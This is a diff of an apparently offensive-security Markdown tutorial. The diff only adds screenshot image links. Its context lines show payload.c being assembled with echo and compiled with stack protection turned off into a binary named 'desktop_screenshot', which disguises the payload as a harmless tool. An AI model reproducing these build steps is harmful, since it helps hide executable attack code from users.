@@ -133,6 +133,8 @@ echo "  ret();" >> payload.c
 echo "}" >> payload.c
 ```
 
+![pic](http://i63.tinypic.com/2q07mg9.png)
+
 <br />
 
 #### :: See whats written inside payload.c (optional)
@@ -141,6 +143,8 @@ echo "}" >> payload.c
 cat payload.c
 ```
 
+![pic](http://i67.tinypic.com/54f57p.png)
+
 <br />
 
 #### :: Use GCC to compile the C program (make it executable)
@@ -148,6 +152,8 @@ cat payload.c
 ```
 sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 ```
+
+![pic](http://i63.tinypic.com/ei6w40.png)
 
 <br />
 
